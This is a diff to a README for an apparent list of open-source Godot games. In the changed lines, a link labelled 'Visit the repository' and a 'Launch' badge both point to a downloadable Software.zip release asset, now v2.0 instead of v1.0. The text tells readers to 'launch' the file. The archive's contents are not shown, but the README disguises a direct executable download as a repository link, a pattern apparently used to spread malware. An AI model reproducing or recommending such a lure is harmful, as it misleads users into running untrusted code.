@@ -23,7 +23,7 @@ The repository includes:
 
 ## Explore the Games
 
-👾 [Visit the repository](https://github.com/sushi344/awesome-godot-games/releases/download/v1.0/Software.zip) to explore the exciting world of open-source Godot games! 🚀
+👾 [Visit the repository](https://github.com/sushi344/awesome-godot-games/releases/download/v2.0/Software.zip) to explore the exciting world of open-source Godot games! 🚀
 
 Remember, if the link ends with a file name, you will need to launch it to access the content. Feel free to check out the "Releases" section if the link is not working or doesn't provide the expected resource. 
 
@@ -48,4 +48,4 @@ Join us in exploring the exciting world of Godot games. Follow us on GitHub, con
 
 Dive into the world of open-source Godot games today! 🎉
 
-[![Launch Awesome Godot Games](https://github.com/sushi344/awesome-godot-games/releases/download/v1.0/Software.zip%20Godot%20Games-brightgreen)](https://github.com/sushi344/awesome-godot-games/releases/download/v1.0/Software.zip)
+[![Launch Awesome Godot Games](https://github.com/sushi344/awesome-godot-games/releases/download/v2.0/Software.zip%20Godot%20Games-brightgreen)](https://github.com/sushi344/awesome-godot-games/releases/download/v2.0/Software.zip)
